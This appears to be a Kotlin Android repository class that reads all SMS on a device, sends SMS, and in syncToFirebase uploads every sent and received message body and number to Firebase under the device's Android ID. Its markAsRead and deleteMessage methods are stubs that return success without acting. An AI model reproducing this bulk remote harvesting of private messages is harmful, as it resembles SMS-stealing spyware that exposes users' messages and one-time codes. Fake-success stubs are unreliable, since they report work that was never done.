package com.example.fast.repository.impl

import android.content.Context
import android.telephony.SmsManager
import com.example.fast.config.AppConfig
import com.example.fast.model.ChatMessage
import com.example.fast.model.SmsConversation
import com.example.fast.model.exceptions.SmsException
import com.example.fast.repository.SmsRepository
import com.example.fast.util.FirebaseResultHelper
import com.example.fast.util.Logger
import com.example.fast.util.Result
import com.example.fast.util.SmsQueryHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Implementation of SmsRepository
 * 
 * Provides concrete implementation of SMS operations using
 * SmsQueryHelper and Firebase.
 */
@Singleton
class SmsRepositoryImpl @Inject constructor(
    private val context: Context
) : SmsRepository {
    
    override suspend fun getAllConversations(): Result<List<SmsConversation>> {
        return try {
            val conversations = withContext(Dispatchers.IO) {
                SmsConversation.fromSmsQueryHelper(context)
            }
            Result.success(conversations)
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to get all conversations")
            Result.error(SmsException.fromException(e))
        }
    }
    
    override suspend fun getConversation(phoneNumber: String): Result<SmsConversation?> {
        return try {
            val conversations = withContext(Dispatchers.IO) {
                SmsConversation.fromSmsQueryHelper(context)
            }
            val conversation = conversations.find { 
                it.contactNumber == phoneNumber || 
                normalizePhoneNumber(it.contactNumber) == normalizePhoneNumber(phoneNumber)
            }
            Result.success(conversation)
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to get conversation for $phoneNumber")
            Result.error(SmsException.fromException(e, phoneNumber))
        }
    }
    
    override suspend fun sendSms(phoneNumber: String, message: String): Result<Unit> {
        return try {
            if (phoneNumber.isBlank() || message.isBlank()) {
                return Result.error(SmsException.invalidPhoneNumber(phoneNumber))
            }
            
            withContext(Dispatchers.IO) {
                val smsManager = SmsManager.getDefault()
                smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            }
            
            // Save to Firebase
            val timestamp = System.currentTimeMillis()
            val androidId = getAndroidId()
            val messagePath = AppConfig.getFirebaseMessagePath(androidId, timestamp)
            Firebase.database.reference.child(messagePath)
                .setValue("sent~$phoneNumber~$message")
            
            Result.success(Unit)
        } catch (e: SecurityException) {
            Logger.e("SmsRepository", e, "Permission denied sending SMS to $phoneNumber")
            Result.error(SmsException.permissionError(phoneNumber))
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to send SMS to $phoneNumber")
            Result.error(SmsException.fromException(e, phoneNumber))
        }
    }
    
    override suspend fun getMessages(phoneNumber: String, limit: Int): Result<List<Any>> {
        return try {
            val messages = withContext(Dispatchers.IO) {
                SmsQueryHelper.getAllMessages(context, phoneNumber)
                    .take(limit)
            }
            Result.success(messages)
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to get messages for $phoneNumber")
            Result.error(SmsException.fromException(e, phoneNumber))
        }
    }
    
    override suspend fun markAsRead(messageId: Long): Result<Unit> {
        // Implementation would update message read status
        // For now, return success as placeholder
        return Result.success(Unit)
    }
    
    override suspend fun deleteMessage(messageId: Long): Result<Unit> {
        // Implementation would delete message
        // For now, return success as placeholder
        return Result.success(Unit)
    }
    
    override suspend fun searchMessages(query: String): Result<List<Any>> {
        return try {
            val allMessages = withContext(Dispatchers.IO) {
                SmsQueryHelper.getAllMessages(context, null)
            }
            val filtered = allMessages.filter { message ->
                message is ChatMessage && (
                    message.body.contains(query, ignoreCase = true) ||
                    message.address.contains(query, ignoreCase = true)
                )
            }
            Result.success(filtered)
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to search messages")
            Result.error(SmsException.fromException(e))
        }
    }
    
    override suspend fun syncToFirebase(deviceId: String): Result<Unit> {
        return try {
            val messages = withContext(Dispatchers.IO) {
                SmsQueryHelper.getAllMessages(context, null)
            }
            
            // Sync messages to Firebase
            messages.forEach { message ->
                if (message is ChatMessage) {
                    val timestamp = message.timestamp
                    val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
                    val messageValue = if (message.isReceived) {
                        "received~${message.address}~${message.body}"
                    } else {
                        "sent~${message.address}~${message.body}"
                    }
                    
                    FirebaseResultHelper.writeData(messagePath, messageValue)
                }
            }
            
            Result.success(Unit)
        } catch (e: Exception) {
            Logger.e("SmsRepository", e, "Failed to sync messages to Firebase")
            Result.error(SmsException.fromException(e))
        }
    }
    
    private fun normalizePhoneNumber(phone: String): String {
        return phone.replace(Regex("[^0-9+]"), "")
    }
    
    @android.annotation.SuppressLint("HardwareIds")
    private fun getAndroidId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: ""
    }
}
